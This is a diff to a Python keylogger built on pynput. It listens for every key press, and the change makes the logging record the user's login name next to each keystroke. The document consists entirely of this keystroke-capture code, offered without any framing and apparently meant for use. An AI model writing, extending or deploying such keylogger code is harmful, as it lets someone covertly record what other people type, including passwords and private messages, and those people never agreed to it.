@@ -1,4 +1,5 @@
 from pynput.keyboard import Key, Listener
+from os import getlogin
 import logging
 import argparse
 from sys import exit
@@ -14,7 +15,7 @@ except FileNotFoundError:
     exit(0)
 
 def on_press(key):
-   logging.info(str(key))
+   logging.info("[{}]: {}".format(getlogin(), str(key)))
 
 with Listener(on_press=on_press) as listener:
     listener.join()
